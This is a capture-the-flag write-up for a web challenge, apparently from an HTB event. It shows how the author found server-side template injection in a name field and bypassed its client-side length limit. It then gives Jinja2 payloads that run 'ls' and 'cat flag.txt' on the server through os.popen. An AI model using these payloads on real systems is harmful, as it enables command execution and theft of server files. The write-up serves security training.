# Challenge
Trial by Fire

As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategiAc mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.

![](HTB%20Apocalypse/web/Trial%20by%20Fire/assets/Pasted%20image%2020250321224731.png)
In this challenge, we have a prompt based from this we can identify if its vulnerable to some kind of injections. I test several injection techniques, until I found a SSTI with this payload.
```
{{7*7}} //result will be 49
```
```
<input type="text" id="warrior_name" name="warrior_name" class="nes-input" required="" placeholder="Enter your name..." maxlength="30" style="background-color: rgba(17, 24, 39, 0.95);">
```
Testing SST payloads from [ssti payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md), but the thing is the input have character limits. Based from the source code its 30 characters max length.

To bypass this we can modify the html in dev tools, leave it as blank. Then inject our SSTi payload into name input to read the current directory of the system.
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```


![](HTB%20Apocalypse/web/Trial%20by%20Fire/assets/Pasted%20image%2020250321224656.png)

We got the flag :)
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```
![](HTB%20Apocalypse/web/Trial%20by%20Fire/assets/Pasted%20image%2020250321224956.png)

![](HTB%20Apocalypse/web/Trial%20by%20Fire/assets/Pasted%20image%2020250321224853.png)

![](HTB%20Apocalypse/web/Trial%20by%20Fire/assets/Pasted%20image%2020250321225037.png)